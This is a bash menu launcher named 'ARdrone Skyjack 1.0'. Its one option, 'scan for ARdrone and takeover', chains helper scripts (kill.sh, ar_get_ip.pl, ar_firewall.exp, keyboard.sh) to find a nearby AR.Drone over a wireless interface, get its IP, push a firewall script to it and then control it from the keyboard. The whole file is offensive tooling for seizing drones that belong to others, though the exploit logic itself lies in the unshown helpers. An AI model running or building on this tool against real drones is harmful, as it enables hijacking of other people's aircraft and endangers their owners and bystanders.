#!/bin/bash

function press_enter
{
    echo ""
    echo -n "Press Enter to continue"
    read
    clear
}

echo "ARdrone Skyjack 1.0"
selection=
#until [ "$selection" = "0" ]; do
    echo ""
    echo "PROGRAM MENU"
    echo "1 - scan for ARdrone and takeover"
    echo ""
    echo "0 - exit program"
    echo ""
    echo -n "Enter selection: "
    read selection
    echo ""
    case $selection in
        1 ) ./kill.sh ;
	    sudo ./ar_get_ip.pl;
	    AR_IP="$(ifconfig | grep -A 1 'wlan2' | tail -1 | cut -d ':' -f 2 | cut -d ' ' -f 1)";
	    echo "ARIP is $AR_IP";
	    sudo ./ar_firewall.exp $AR_IP;
	         ./keyboard.sh;
	press_enter ;;
        0 ) exit ;;
        * ) echo "Please enter 1 or 0"; press_enter
    esac
#done
